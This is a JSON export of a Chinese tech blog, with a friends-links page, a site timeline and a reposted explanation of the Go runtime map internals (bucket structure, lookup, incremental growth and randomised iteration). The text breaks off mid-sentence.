[{"categories":null,"contents":"  Theodore Sun\n一哥的博客: 一蓑烟雨任平生， 心之所向，素履以往    qingshanyinyin\n林夕-博客：太阳底下没有阴影。这是用beego编写的博客    DavidStack\n德奎的云里雾里：云计算 Kubernetes/Docker AI/AI平台 搬砖工程师 一直站着工程师    Tuantuan.G\n是设计师，也是小伙伴。有想法，有理念；爱画画，有创意。从视觉设计到UI平面，样样漂亮    索洪波\n是程序员，也是段子手，低调深刻有内涵    曹春晖\n曹大的博客，Github @ https://github.com/cch123    柴树杉\n柴树杉的博客    廖雪峰\n廖雪峰的官方网站    阮一峰\n阮一峰的网络日志    Andrew Meredith\nAndrew is a software engineer who has a passion for developing data-intensive applications. Functional programming, scalable application architectures, and performance are a few of his favorite topics.    Walton Wang\ntencent Walton   --  蓝调口琴网\n晓松的布鲁斯口琴站   ","permalink":"http://bingerambo.com/friend/","tags":null,"title":"群英会"},{"categories":null,"contents":"2021    2021-11-01 16:00  如无必要，勿增实体。大道至简。\n     2021-09-30 19:00  一切都是命运，一切都是烟云。 一切都是没有结局的开始，一切都是稍纵即逝的追寻。\n     2021-01-14 23:00  生活的悲欢离合远在地平线以外，而眺望是一种青春的姿态。\n    2020    2020-12-31 21:46 随记栏目改版  自定义css3模板，随记版面UI升级\n     2020-10-04 22:00 小站改版  原来小站采用的jeckyll，归档工作笔记和随笔心得不是太方便，且生成页面速度缓慢。现为提升效率和检索资料，从UI到框架重新整下，花了2个周末搞定。小站的代码复制和搜索功能挺好用\n     2020-3-11 11:00 kubernetes源码分析  参考电子书目https://www.bookstack.cn/read/source-code-reading-notes/README.md\n    2018    2018-07-27 再出发  开启新的征程：收拾下，从零开始。。。\n    2017    2017-03-25  深度学习，看论文的速度赶不上出论文的速度。\n    2016    2016-08-01  在这座喧嚣的城市，每天低头的忙碌，浮躁的心情，使得渐渐不再关心身边的人，慢慢不再留意周遭景物。而Tuantuan.G的随笔图文，以发现美的心灵，撷取了这座城和你我身边的美丽片景。。。\n     2016-07-09 小站开张  小站开张，欢迎来逛 \\(- -)/\n    ","permalink":"http://bingerambo.com/timeline/","tags":null,"title":"记点滴，积跬步"},{"categories":["Go"],"contents":"【转载】go-map源码简单分析（map遍历为什么时随机的） 文章从这里搬运：https://www.helloworld.net/p/3714029944\nGO 中map的底层是如何实现的 首先Go 语言采用的是哈希查找表，并且使用链表解决哈希冲突。\nGO的内存模型 先看这一张map原理图\nmap\n再来看看源码中map的定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  //src/runtime/map.go line 115  // A header for a Go map. type hmap struct { // Note: the format of the hmap is also encoded in cmd/compile/internal/gc/reflect.go.  // Make sure this stays in sync with the compiler\u0026#39;s definition.  //  count int //len(map)时，返回的值  flags uint8 //表示是否有其他协程在操作map  B uint8 //上图中[]bmap的\u0026#39;\u0026#39;长度\u0026#39;\u0026#39; 2^B  noverflow uint16 //// 溢出的bucket个数  hash0 uint32 // hash seed  buckets unsafe.Pointer //buckets 数组指针  oldbuckets unsafe.Pointer // 扩容的时候用于赋值的buckets数组  nevacuate uintptr // 搬迁进度  extra *mapextra // 用于扩容的指针  type mapextra struct { overflow *[]*bmap oldoverflow *[]*bmap nextOverflow *bmap } // A bucket for a Go map. type bmap struct { tophash [bucketCnt]uint8 // len为8的数组 } //底层定义的常量 const ( // Maximum number of key/value pairs a bucket can hold.  bucketCntBits = 3 bucketCnt = 1 \u0026lt;\u0026lt; bucketCntBits }   但这只是表面(src/runtime/hashmap.go)的结构，编译期间会给它加料，动态地创建一个新的结构：\n1 2 3 4 5 6 7  type bmap struct { topbits [8]uint8 keys [8]keytype values [8]valuetype pad uintptr overflow uintptr }   bmap 就是我们常说的“桶”，桶里面会最多装 8 个 key，这些 key 之所以会落入同一个桶，是因为它们经过哈希计算后，哈希结果是“一类”的(低位的B位决定bucket)。在桶内，又会根据 key 计算出来的 hash 值的高 8 位来决定 key 到底落入桶内的哪个位置（一个桶内最多有8个位置）。如上图所示\nbmap 是存放 k-v 的地方，我们把视角拉近，仔细看 bmap 的内部组成。\n上图就是 bucket 的内存模型， HOBHash 指的就是 top hash。注意到 key 和 value 是各自放在一起的，并不是 key/value/key/value/… 这样的形式。源码里说明这样的好处是在某些情况下可以省略掉 padding 字段，节省内存空间。\n每个 bucket 设计成最多只能放 8 个 key-value 对，如果有第 9 个 key-value 落入当前的 bucket，那就需要再构建一个 bucket ，通过 overflow 指针连接起来。\n创建map 从语法上来说，创建一个map很简单（记得key的类型必须为可比较类型）\n1 2 3 4 5 6 7  maps := make(map[string]int) maps2 := map[string]int{ \u0026#34;1\u0026#34;:1, \u0026#34;2\u0026#34;:2, \u0026#34;3\u0026#34;:3, } var maps3 map[string]int   通过汇编语言可以看到，实际上底层调用的是 makemap 函数，主要做的工作就是初始化 hmap 结构体的各种字段，例如计算 B 的大小，设置哈希种子 hash0 等等。\n1  func makemap(t *maptype, hint int64, h *hmap, bucket unsafe.Pointer) *hmap   注意，这个函数返回的结果：*hmap，它是一个指针\n1  func makeslice(et *_type, len, cap int) slice   hash函数 map 的一个关键点在于，哈希函数的选择。在程序启动时，会检测 cpu 是否支持 aes，如果支持，则使用 aes hash，否则使用 memhash。这是在函数 alginit() 中完成，位于路径：src/runtime/alg.go 下。\n hash 函数，有加密型和非加密型。加密型的一般用于加密数据、数字摘要等，典型代表就是 md5、sha1、sha256、aes256 这种；非加密型的一般就是查找。在 map 的应用场景中，用的是查找。选择 hash 函数主要考察的是两点：性能、碰撞概率。\n key的定位过程 key 经过哈希计算后得到哈希值，共 64 个 bit 位（64位机，32位机就不讨论了，现在主流都是64位机），计算它到底要落在哪个桶时，只会用到最后 B 个 bit 位。还记得前面提到过的 B 吗？如果 B = 5，那么桶的数量，也就是 buckets 数组的长度是 2^5 = 32。 例如，现在有一个 key 经过哈希函数计算后，得到的哈希结果是：\n1  10010111 | 000011110110110010001111001010100010010110010101010 │ 01010   用最后的 5 个 bit 位，也就是 01010，值为 10，也就是 10 号桶。这个操作实际上就是取余操作，但是取余开销太大，所以代码实现上用的位操作代替。 再用哈希值的高 8 位，找到此 key 在 bucket 中的位置，这是在寻找已有的 key。最开始桶内还没有 key，新加入的 key 会找到第一个空位，放入。\nbuckets 编号就是桶编号，当两个不同的 key 落在同一个桶中，也就是发生了哈希冲突。冲突的解决手段是用链表法：在 bucket 中，从前往后找到第一个空位。这样，在查找某个 key 时，先找到对应的桶，再去遍历 bucket 中的 key。\n这里参考曹大 github 博客里的一张图\nkey定位过程\n上图中，假定 B = 5，所以 bucket 总数就是 2^5 = 32。首先计算出待查找 key 的哈希，使用低 5 位 00110，找到对应的 6 号 bucket，使用高 8 位 10010111，对应十进制 151，在 6 号 bucket 中寻找 tophash 值（HOB hash）为 151 的 key，找到了 2 号槽位，这样整个查找过程就结束了。\n如果在 bucket 中没找到，并且 overflow 不为空，还要继续去 overflow bucket 中寻找，直到找到或是所有的 key 槽位都找遍了，包括所有的 overflow bucket。\n看看key的查找过程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer { //...  // 如果 h 什么都没有，返回零值  if h == nil || h.count == 0 { return unsafe.Pointer(\u0026amp;zeroVal[0]) } // 写和读冲突  if h.flags\u0026amp;hashWriting != 0 { throw(\u0026#34;concurrent map read and map write\u0026#34;) } // 不同类型 key 使用的 hash 算法在编译期确定  alg := t.key.alg // 计算哈希值，并且加入 hash0 引入随机性  hash := alg.hash(key, uintptr(h.hash0)) // 比如 B=5，那 m 就是31，二进制是全 1  // 求 bucket num 时，将 hash 与 m 相与，  // 达到 bucket num 由 hash 的低 8 位决定的效果  m := bucketMask(h.B) // b 就是 bucket 的地址  b := (*bmap)(add(h.buckets, (hash\u0026amp;m)*uintptr(t.bucketsize))) // oldbuckets 不为 nil，说明发生了扩容  if c := h.oldbuckets; c != nil { // 如果不是同 size 扩容（看后面扩容的内容）  // 对应条件 1 的解决方案  if !h.sameSizeGrow() { // 新 bucket 数量是老的 2 倍  m \u0026gt;\u0026gt;= 1 } // 求出 key 在老的 map 中的 bucket 位置  oldb := (*bmap)(add(c, (hash\u0026amp;m)*uintptr(t.bucketsize))) // 如果 oldb 没有搬迁到新的 bucket  // 那就在老的 bucket 中寻找  if !evacuated(oldb) { b = oldb } } // 计算出高 8 位的 hash  // 相当于右移 56 位，只取高8位  top := tophash(hash) //开始寻找key  for ; b != nil; b = b.overflow(t) { // 遍历 8 个 bucket  for i := uintptr(0); i \u0026lt; bucketCnt; i++ { // tophash 不匹配，继续  if b.tophash[i] != top { continue } // tophash 匹配，定位到 key 的位置  k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize)) // key 是指针  if t.indirectkey { // 解引用  k = *((*unsafe.Pointer)(k)) } // 如果 key 相等  if alg.equal(key, k) { // 定位到 value 的位置  v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) // value 解引用  if t.indirectvalue { v = *((*unsafe.Pointer)(v)) } return v } } } return unsafe.Pointer(\u0026amp;zeroVal[0]) }   函数返回 h[key] 的指针，如果 h 中没有此 key，那就会返回一个 key 相应类型的零值，不会返回 nil。\nbucket 里 key 的起始地址就是 unsafe.Pointer(b)+dataOffset。第 i 个 key 的地址就要在此基础上跨过 i 个 key 的大小；而我们又知道，value 的地址是在所有 key 之后，因此第 i 个 value 的地址还需要加上所有 key 的偏移。\n1 2 3 4 5 6 7 8 9 10 11  // key 定位公式 k :=add(unsafe.Pointer(b),dataOffset+i*uintptr(t.keysize)) // value 定位公式 v:= add(unsafe.Pointer(b),dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) //对于 bmap 起始地址的偏移： dataOffset = unsafe.Offsetof(struct{ b bmap v int64 }{}.v)   map读取的两个操作 Go 语言中读取 map 有两种语法：带 comma 和 不带 comma。当要查询的 key 不在 map 里，带 comma 的用法会返回一个 bool 型变量提示 key 是否在 map 中；而不带 comma 的语句则会返回一个 value 类型的零值。如果 value 是 int 型就会返回 0，如果 value 是 string 类型，就会返回空字符串。\n1 2  value := maps[\u0026#34;1\u0026#34;] value2,ok := maps[\u0026#34;1\u0026#34;]   以前一直觉得好神奇，怎么实现的？这其实是编译器在背后做的工作：分析代码后，将两种语法对应到底层两个不同的函数。\n1 2 3  //src/runtime/map.go line 394 func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer func mapaccess2(t *maptype, h *hmap, key unsafe.Pointer) (unsafe.Pointer, bool)   map如何扩容 使用哈希表的目的就是要快速查找到目标 key，然而，随着向 map 中添加的 key 越来越多，key 发生碰撞的概率也越来越大。bucket 中的 8 个 cell 会被逐渐塞满，查找、插入、删除 key 的效率也会越来越低。 Go 语言采用一个 bucket 里装载 8 个 key，定位到某个 bucket 后，还需要再定位到具体的 key，这实际上又用了时间换空间。 所有的 key 都落在了同一个 bucket 里，a直接退化成了链表，各种操作的效率直接降为 O(n)。\n因此，需要有一个指标来衡量前面描述的情况，这就是 装载因子。Go 源码里这样定义 装载因子：loadFactor := count /(2^B)\ncount 就是 map 的元素个数，2^B 表示 bucket 数量。\n再来说触发 map 扩容的时机：在向 map 插入新 key 的时候，会进行条件检测，符合下面这 2 个条件，就会触发扩容：\n 装载因子超过阈值，源码里定义的阈值是 6.5。 overflow 的 bucket 数量过多：当 B 小于 15，也就是 bucket 总数 2^B 小于 2^15 时，overflow 的 bucket 数量超过 2^B；扩容 当 B \u0026gt;= 15，也就是 bucket 总数 2^B 大于等于 2^15， overflow 的 bucket 数量超过 2^15。扩容。  触发扩容的代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // If we hit the max load factor or we have too many overflow buckets,  // and we\u0026#39;re not already in the middle of growing, start growing.  if !h.growing() \u0026amp;\u0026amp; (overLoadFactor(h.count+1, h.B) || tooManyOverflowBuckets(h.noverflow, h.B)) { hashGrow(t, h) } // overLoadFactor reports whether count items placed in 1\u0026lt;\u0026lt;B buckets is over loadFactor. func overLoadFactor(count int, B uint8) bool { return count \u0026gt; bucketCnt \u0026amp;\u0026amp; uintptr(count) \u0026gt; loadFactorNum*(bucketShift(B)/loadFactorDen) } func tooManyOverflowBuckets(noverflow uint16, B uint8) bool { // If the threshold is too low, we do extraneous work.  // If the threshold is too high, maps that grow and shrink can hold on to lots of unused memory.  // \u0026#34;too many\u0026#34; means (approximately) as many overflow buckets as regular buckets.  // See incrnoverflow for more details.  if B \u0026gt; 15 { B = 15 } // The compiler doesn\u0026#39;t see here that B \u0026lt; 16; mask B to generate shorter shift code.  return noverflow \u0026gt;= uint16(1)\u0026lt;\u0026lt;(B\u0026amp;15) }   第 1 点：我们知道，每个 bucket 有 8 个空位，在没有溢出，且所有的桶都装满了的情况下，装载因子算出来的结果是 8。因此当装载因子超过 6.5 时，表明很多 bucket 都快要装满了，查找效率和插入效率都变低了。在这个时候进行扩容是有必要的。\n第 2 点：是对第 1 点的补充。就是说在装载因子比较小的情况下，这时候 map 的查找和插入效率也很低，而第 1 点识别不出来这种情况。表面现象就是计算装载因子的分子比较小，即 map 里元素总数少，但是 bucket 数量多（真实分配的 bucket 数量多，包括大量的 overflow bucket）。\n不难想像造成这种情况的原因：不停地插入、删除元素。先插入很多元素，导致创建了很多 bucket，但是装载因子达不到第 1 点的临界值，未触发扩容来缓解这种情况。之后，删除元素降低元素总数量，再插入很多元素，导致创建很多的 overflow bucket，但就是不会触犯第 1 点的规定，你能拿我怎么办？overflow bucket 数量太多，导致 key 会很分散，查找插入效率低得吓人，因此出台第 2 点规定。这就像是一座空城，房子很多，但是住户很少，都分散了，找起人来很困难。\n第 2 点：是对第 1 点的补充。就是说在装载因子比较小的情况下，这时候 map 的查找和插入效率也很低，而第 1 点识别不出来这种情况。表面现象就是计算装载因子的分子比较小，即 map 里元素总数少，但是 bucket 数量多（真实分配的 bucket 数量多，包括大量的 overflow bucket）。\n不难想像造成这种情况的原因：不停地插入、删除元素。先插入很多元素，导致创建了很多 bucket，但是装载因子达不到第 1 点的临界值，未触发扩容来缓解这种情况。之后，删除元素降低元素总数量，再插入很多元素，导致创建很多的 overflow bucket，但就是不会触犯第 1 点的规定，你能拿我怎么办？overflow bucket 数量太多，导致 key 会很分散，查找插入效率低得吓人，因此出台第 2 点规定。这就像是一座空城，房子很多，但是住户很少，都分散了，找起人来很困难。\n对于条件 1，元素太多，而 bucket 数量太少，很简单：将 B 加 1，bucket 最大数量（2^B）直接变成原来 bucket 数量的 2 倍。于是，就有新老 bucket 了。注意，这时候元素都在老 bucket 里，还没迁移到新的 bucket 来。而且，新 bucket 只是最大数量变为原来最大数量（2^B）的 2 倍（2^B * 2）。\n如果插入 map 的 key 哈希都一样，就会落到同一个 bucket 里，超过 8 个就会产生 overflow bucket，结果也会造成 overflow bucket 数过多。移动元素其实解决不了问题，因为这时整个哈希表已经退化成了一个链表，操作效率变成了 O(n)。\n再来看一下扩容具体是怎么做的。由于 map 扩容需要将原有的 key/value 重新搬迁到新的内存地址，如果有大量的 key/value 需要搬迁，会非常影响性能。因此 Go map 的扩容采取了一种称为“渐进式”地方式，原有的 key 并不会一次性搬迁完毕，每次最多只会搬迁 2 个 bucket。\nhashGrow() 函数实际上并没有真正地“搬迁”，它只是分配好了新的 buckets，并将老的 buckets 挂到了 oldbuckets 字段上。真正搬迁 buckets 的动作在 growWork() 函数中，而调用 growWork() 函数的动作是在 mapassign 和 mapdelete 函数中。也就是插入或修改、删除 key 的时候，都会尝试进行搬迁 buckets 的工作。先检查 oldbuckets 是否搬迁完毕，具体来说就是检查 oldbuckets 是否为 nil。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  func hashGrow(t *maptype, h *hmap) { // B+1 相当于是原来 2 倍的空间  bigger := uint8(1) // 对应条件 2  if !overLoadFactor(h.count+1, h.B) { // 进行等量的内存扩容，所以 B 不变  bigger = 0 h.flags |= sameSizeGrow } // 将老 buckets 挂到 buckets 上  oldbuckets := h.buckets // 申请新的 buckets 空间  newbuckets, nextOverflow := makeBucketArray(t, h.B+bigger, nil) //先把 h.flags 中 iterator 和 oldIterator 对应位清 0  //如果 iterator 位为 1，把它转接到 oldIterator 位，使得 oldIterator 标志位变成1  //可以理解为buckets 现在挂到了 oldBuckets 名下了，将对应的标志位也转接过去  flags := h.flags \u0026amp;^ (iterator | oldIterator) if h.flags\u0026amp;iterator != 0 { flags |= oldIterator } // commit the grow (atomic wrt gc)  h.B += bigger h.flags = flags h.oldbuckets = oldbuckets h.buckets = newbuckets // 搬迁进度为 0  h.nevacuate = 0 // overflow buckets 数为 0  h.noverflow = 0 }   主要是申请到了新的 buckets 空间，把相关的标志位都进行了处理：例如标志 nevacuate 被置为 0， 表示当前搬迁进度为 0。 转移的几个标志位如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // 可能有迭代器使用 buckets iterator = 1 // 可能有迭代器使用 oldbuckets oldIterator = 2 // 有协程正在向 map 中写入 key hashWriting = 4 // 等量扩容（对应条件 2） sameSizeGrow = 8 // 可能有迭代器使用 buckets iterator = 1 // 可能有迭代器使用 oldbuckets oldIterator = 2 // 有协程正在向 map 中写入 key hashWriting = 4 // 等量扩容（对应条件 2） sameSizeGrow = 8   再来看看真正执行搬迁工作的 growWork() 函数。\n1 2 3 4 5 6 7 8 9 10 11 12  func growWork(t *maptype, h *hmap, bucket uintptr) { // 搬迁正在使用的旧 bucket  evacuate(t, h, bucket\u0026amp;h.oldbucketmask()) // 再搬迁一个 bucket，以加快搬迁进程  if h.growing() { evacuate(t, h, h.nevacuate) } } func (h *hmap) growing() bool { return h.oldbuckets != nil }   bucket\u0026amp;h.oldbucketmask() 这行代码，如源码注释里说的，是为了确认搬迁的 bucket 是我们正在使用的 bucket。oldbucketmask() 函数返回扩容前的 map 的 bucketmask。\n搬迁过程evacuate源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129  type evacDst struct { b *bmap // 表示bucket 移动的目标地址  i int // 指向 x,y 中 key/val 的 index  k unsafe.Pointer // 指向 x，y 中的 key  v unsafe.Pointer // 指向 x，y 中的 value } func evacuate(t *maptype, h *hmap, oldbucket uintptr) { // 定位老的 bucket 地址  b := (*bmap)(add(h.oldbuckets, oldbucket*uintptr(t.bucketsize))) // 计算容量 结果是 2^B，如 B = 5，结果为32  newbit := h.noldbuckets() // 如果 b 没有被搬迁过  if !evacuated(b) { // 默认是等 size 扩容，前后 bucket 序号不变  var xy [2]evacDst // 使用 x 来进行搬迁  x := \u0026amp;xy[0] x.b = (*bmap)(add(h.buckets, oldbucket*uintptr(t.bucketsize))) x.k = add(unsafe.Pointer(x.b), dataOffset) x.v = add(x.k, bucketCnt*uintptr(t.keysize)) // 如果不是等 size 扩容，前后 bucket 序号有变  if !h.sameSizeGrow() { // 使用 y 来进行搬迁  y := \u0026amp;xy[1] // y 代表的 bucket 序号增加了 2^B  y.b = (*bmap)(add(h.buckets, (oldbucket+newbit)*uintptr(t.bucketsize))) y.k = add(unsafe.Pointer(y.b), dataOffset) y.v = add(y.k, bucketCnt*uintptr(t.keysize)) } // 遍历所有的 bucket，包括 overflow buckets b 是老的 bucket 地址  for ; b != nil; b = b.overflow(t) { k := add(unsafe.Pointer(b), dataOffset) v := add(k, bucketCnt*uintptr(t.keysize)) // 遍历 bucket 中的所有 cell  for i := 0; i \u0026lt; bucketCnt; i, k, v = i+1, add(k, uintptr(t.keysize)), add(v, uintptr(t.valuesize)) { // 当前 cell 的 top hash 值  top := b.tophash[i] // 如果 cell 为空，即没有 key  if top == empty { // 那就标志它被\u0026#34;搬迁\u0026#34;过  b.tophash[i] = evacuatedEmpty continue } // 正常不会出现这种情况  // 未被搬迁的 cell 只可能是 empty 或是  // 正常的 top hash（大于 minTopHash）  if top \u0026lt; minTopHash { throw(\u0026#34;bad map state\u0026#34;) } // 如果 key 是指针，则解引用  k2 := k if t.indirectkey { k2 = *((*unsafe.Pointer)(k2)) } var useY uint8 // 如果不是等量扩容  if !h.sameSizeGrow() { // 计算 hash 值，和 key 第一次写入时一样  hash := t.key.alg.hash(k2, uintptr(h.hash0)) // 如果有协程正在遍历 map 如果出现 相同的 key 值，算出来的 hash 值不同  if h.flags\u0026amp;iterator != 0 \u0026amp;\u0026amp; !t.reflexivekey \u0026amp;\u0026amp; !t.key.alg.equal(k2, k2) { // useY =1 使用位置Y  useY = top \u0026amp; 1 top = tophash(hash) } else { // 第 B 位置 不是 0  if hash\u0026amp;newbit != 0 { //使用位置Y  useY = 1 } } } if evacuatedX+1 != evacuatedY { throw(\u0026#34;bad evacuatedN\u0026#34;) } //决定key是裂变到 X 还是 Y  b.tophash[i] = evacuatedX + useY // evacuatedX + 1 == evacuatedY  dst := \u0026amp;xy[useY] // evacuation destination  // 如果 xi 等于 8，说明要溢出了  if dst.i == bucketCnt { // 新建一个 bucket  dst.b = h.newoverflow(t, dst.b) // xi 从 0 开始计数  dst.i = 0 //key移动的位置  dst.k = add(unsafe.Pointer(dst.b), dataOffset) //value 移动的位置  dst.v = add(dst.k, bucketCnt*uintptr(t.keysize)) } // 设置 top hash 值  dst.b.tophash[dst.i\u0026amp;(bucketCnt-1)] = top // mask dst.i as an optimization, to avoid a bounds check  // key 是指针  if t.indirectkey { // 将原 key（是指针）复制到新位置  *(*unsafe.Pointer)(dst.k) = k2 // copy pointer  } else { // 将原 key（是值）复制到新位置  typedmemmove(t.key, dst.k, k) // copy value  } //value同上  if t.indirectvalue { *(*unsafe.Pointer)(dst.v) = *(*unsafe.Pointer)(v) } else { typedmemmove(t.elem, dst.v, v) } // 定位到下一个 cell  dst.i++ dst.k = add(dst.k, uintptr(t.keysize)) dst.v = add(dst.v, uintptr(t.valuesize)) } } // Unlink the overflow buckets \u0026amp; clear key/value to help GC.  // bucket搬迁完毕 如果没有协程在使用老的 buckets，就把老 buckets 清除掉，帮助gc  if h.flags\u0026amp;oldIterator == 0 \u0026amp;\u0026amp; t.bucket.kind\u0026amp;kindNoPointers == 0 { b := add(h.oldbuckets, oldbucket*uintptr(t.bucketsize)) ptr := add(b, dataOffset) n := uintptr(t.bucketsize) - dataOffset memclrHasPointers(ptr, n) } } // 更新搬迁进度  if oldbucket == h.nevacuate { advanceEvacuationMark(h, t, newbit) } }   通过前面的说明我们知道，应对条件 1，新的 buckets 数量是之前的一倍，应对条件 2，新的 buckets 数量和之前相等。 对于条件 1，从老的 buckets 搬迁到新的 buckets，由于 bucktes 数量不变，因此可以按序号来搬，比如原来在 0 号 bucktes，到新的地方后，仍然放在 0 号 buckets。\n对于条件 2，就没这么简单了。要重新计算 key 的哈希，才能决定它到底落在哪个 bucket。例如，原来 B = 5，计算出 key 的哈希后，只用看它的低 5 位，就能决定它落在哪个 bucket。扩容后，B 变成了 6，因此需要多看一位，它的低 6 位决定 key 落在哪个 bucket。这称为 rehash。\nrehash\n因此，某个 key 在搬迁前后 bucket 序号可能和原来相等，也可能是相比原来加上 2^B（原来的 B 值），取决于 hash 值 第 6 bit 位是 0 还是 1。\n理解了上面 bucket 序号的变化，我们就可以回答另一个问题了：为什么遍历 map 是无序的？\nmap 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。\n按理说每次遍历这样的 map 都会返回一个固定顺序的 key/value 序列吧。的确是这样，但是 Go 杜绝了这种做法，因为这样会给新手程序员带来误解，以为这是一定会发生的事情，在某些情况下，可能会酿成大错。\nGo 做得更绝，当我们在遍历 map 时，并不是固定地从 0 号 bucket 开始遍历，每次都是从一个随机值序号的 bucket 开始遍历，并且是从这个 bucket 的一个随机序号的 cell 开始遍历。这样，即使你是一个写死的 map，仅仅只是遍历它，也不太可能会返回一个固定序列的 key/value 对了\n再明确一个问题：如果扩容后，B 增加了 1，意味着 buckets 总数是原来的 2 倍，原来 1 号的桶“裂变”到两个桶。\n例如，原始 B = 2，1号 bucket 中有 2 个 key 的哈希值低 3 位分别为：010，110。由于原来 B = 2，所以低 2 位 10 决定它们落在 2 号桶，现在 B 变成 3，所以 010、 110 分别落入 2、6 号桶。(这与数据库的动态hash索引类似)\n有一个特殊情况是：有一种 key，每次对它计算 hash，得到的结果都不一样。这个 key 就是 math.NaN() 的结果，它的含义是 nota number，类型是 float64。当它作为 map 的 key，在搬迁的时候，会遇到一个问题：再次计算它的哈希值和它当初插入 map 时的计算出来的哈希值不一样！\n你可能想到了，这样带来的一个后果是，这个 key 是永远不会被 Get 操作获取的！当我使用 m[math.NaN()] 语句的时候，是查不出来结果的。这个 key 只有在遍历整个 map 的时候，才有机会现身。所以，可以向一个 map 插入任意数量的 math.NaN() 作为 key。\n下面通过图来宏观地看一下扩容前后的变化。\n扩容前，B = 2，共有 4 个 buckets，lowbits 表示 hash 值的低位。假设我们不关注其他 buckets 情况，专注在 2 号 bucket。并且假设 overflow 太多，触发了等量扩容（对应于前面的条件 2）。\n扩容完成后，overflow bucket 消失了，key 都集中到了一个 bucket，更为紧凑了，提高了查找的效率。\n假设触发了 2 倍的扩容，那么扩容完成后，老 buckets 中的 key 分裂到了 2 个 新的 bucket。一个在 x part，一个在 y 的 part。依据是 hash 的 lowbits。新 map 中 0-3称为 x part， 4-7 称为 y part。\nmap遍历 本来 map 的遍历过程比较简单：遍历所有的 bucket 以及它后面挂的 overflow bucket，然后挨个遍历 bucket 中的所有 cell。每个 bucket 中包含 8 个 cell，从有 key 的 cell 中取出 key 和 value，这个过程就完成了。\n但是，现实并没有这么简单。还记得前面讲过的扩容过程吗？扩容过程不是一个原子的操作，它每次最多只搬运 2 个 bucket，所以如果触发了扩容操作，那么在很长时间里，map 的状态都是处于一个中间态：有些 bucket 已经搬迁到新家，而有些 bucket 还待在老地方。\n因此，遍历如果发生在扩容的过程中，就会涉及到遍历新老 bucket 的过程，这是难点所在。\n关于 map 迭代，先是调用 mapiterinit 函数初始化迭代器，然后循环调用 mapiternext 函数进行 map 迭代。\n前面已经提到过，即使是对一个写死的 map 进行遍历，每次出来的结果也是无序的。下面我们就可以近距离地观察他们的实现了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  func mapiterinit(t *maptype, h *hmap, it *hiter) { ... it.t = t it.h = h it.B = h.B it.buckets = h.buckets if t.bucket.kind\u0026amp;kindNoPointers != 0 { h.createOverflow() it.overflow = h.extra.overflow it.oldoverflow = h.extra.oldoverflow } r := uintptr(fastrand()) if h.B \u0026gt; 31-bucketCntBits { r += uintptr(fastrand()) \u0026lt;\u0026lt; 31 } it.startBucket = r \u0026amp; bucketMask(h.B) it.offset = uint8(r \u0026gt;\u0026gt; h.B \u0026amp; (bucketCnt - 1)) it.bucket = it.startBucket ... mapiternext(it) }   重点是fastrand 的部分，是一个生成随机数的方法：它生成了随机数。用于决定从哪里开始循环迭代。更具体的话就是根据随机数，选择一个桶位置作为起始点进行遍历迭代因此每次重新 for range map，你见到的结果都是不一样的。那是因为它的起始位置根本就不固定！\n1 2 3 4 5 6 7 8 9 10 11  ... // decide where to start r := uintptr(fastrand()) if h.B \u0026gt; 31-bucketCntBits { r += uintptr(fastrand()) \u0026lt;\u0026lt; 31 } it.startBucket = r \u0026amp; bucketMask(h.B) it.offset = uint8(r \u0026gt;\u0026gt; h.B \u0026amp; (bucketCnt - 1)) // iterator state it.bucket = it.startBucket   map的赋值和更新 ，向 map 中插入或者修改 key，最终调用的是 mapassign 函数。\n实际上插入或修改 key 的语法是一样的，只不过前者操作的 key 在 map 中不存在，而后者操作的 key 存在 map 中。\nmapassign 有一个系列的函数，根据 key 类型的不同，编译器会将其优化为相应的“快速函数”。\n整体来看，流程非常得简单：对 key 计算 hash 值，根据 hash 值按照之前的流程，找到要赋值的位置（可能是插入新 key，也可能是更新老 key），对相应位置进行赋值。\n源码大体和之前讲的类似，核心还是一个双层循环，外层遍历 bucket 和它的 overflow bucket，内层遍历整个 bucket 的各个 cell\n函数首先会检查 map 的标志位 flags。如果 flags 的写标志位此时被置 1 了，说明有其他协程在执行“写”操作，进而导致程序 panic。这也说明了 map 对协程是不安全的。\n通过前文我们知道扩容是渐进式的，如果 map 处在扩容的过程中，那么当 key 定位到了某个 bucket 后，需要确保这个 bucket 对应的老 bucket 完成了迁移过程。即老 bucket 里的 key 都要迁移到新的 bucket 中来（分裂到 2 个新 bucket），才能在新的 bucket 中进行插入或者更新的操作。\n上面说的操作是在函数靠前的位置进行的，只有进行完了这个搬迁操作后，我们才能放心地在新 bucket 里定位 key 要安置的地址，再进行之后的操作。\n现在到了定位 key 应该放置的位置了，所谓找准自己的位置很重要。准备两个指针，一个（ inserti）指向 key 的 hash 值在 